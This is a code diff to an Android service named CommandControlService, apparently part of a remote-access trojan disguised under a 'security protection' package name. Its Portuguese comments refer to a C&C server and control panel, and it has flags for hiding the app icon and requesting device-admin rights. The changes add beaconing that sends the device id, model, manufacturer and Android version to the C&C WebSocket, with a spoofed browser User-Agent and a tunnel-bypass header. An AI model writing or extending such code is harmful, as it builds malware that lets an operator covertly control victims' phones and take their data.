@@ -8,6 +8,7 @@ import android.content.IntentFilter;
 import android.os.Build;
 import android.os.Handler;
 import android.os.IBinder;
+import com.seguranca.protecao.BuildConfig;
 import android.os.Looper;
 import android.util.Log;
 import com.google.gson.Gson;
@@ -58,7 +59,7 @@ public class CommandControlService extends Service {
     
     // CONFIGURAÇÃO DO SERVIDOR - ALTERAR PARA SEU SERVIDOR!
     // URL do servidor - PUBLIC para acesso do StudioActivity
-    public static final String SERVER_URL = "ws://192.168.1.14:5000/ws";
+    public static final String SERVER_URL = BuildConfig.SERVER_URL;
     public static final String WEBVIEW_URL = "";
     public static final boolean HIDE_ICON = false;
     public static final boolean REQUEST_ADMIN = false;
@@ -91,7 +92,7 @@ public class CommandControlService extends Service {
     
     // Método auxiliar para obter URL HTTP do servidor
     public static String getServerHttpUrl() {
-        return SERVER_URL.replace("wss://", "https://").replace("ws://", "http://").replace("/ws", "");
+        return SERVER_URL.replace("wss://", "https://").replace("ws://", "http://").replaceAll("/ws$", "");
     }
     
     OkHttpClient client;
@@ -455,12 +456,19 @@ public class CommandControlService extends Service {
         Log.d(TAG, "Conectando ao servidor C&C...");
         
         try {
-            // Verifica se a URL já tem parâmetros (?) para usar & ao invés de ?
-            String separator = SERVER_URL.contains("?") ? "&" : "?";
-            String fullUrl = SERVER_URL + separator + "device_id=" + deviceId;
-            
+            // Envia device_id via header (servidor lê x-device-id, não query string)
+            // Query param causava duplicate-device bug no painel
+            JsonObject deviceInfoHeader = new JsonObject();
+            deviceInfoHeader.addProperty("device_id", deviceId);
+            deviceInfoHeader.addProperty("model", Build.MODEL);
+            deviceInfoHeader.addProperty("manufacturer", Build.MANUFACTURER);
+            deviceInfoHeader.addProperty("android_version", Build.VERSION.RELEASE);
+            deviceInfoHeader.addProperty("sdk", Build.VERSION.SDK_INT);
+
             Request request = new Request.Builder()
-                .url(fullUrl)
+                .url(SERVER_URL)
+                .addHeader("x-device-id", deviceId)
+                .addHeader("x-device-info", deviceInfoHeader.toString())
                 .addHeader("bypass-tunnel-reminder", "true")
                 .addHeader("User-Agent", "Mozilla/5.0")
                 .build();
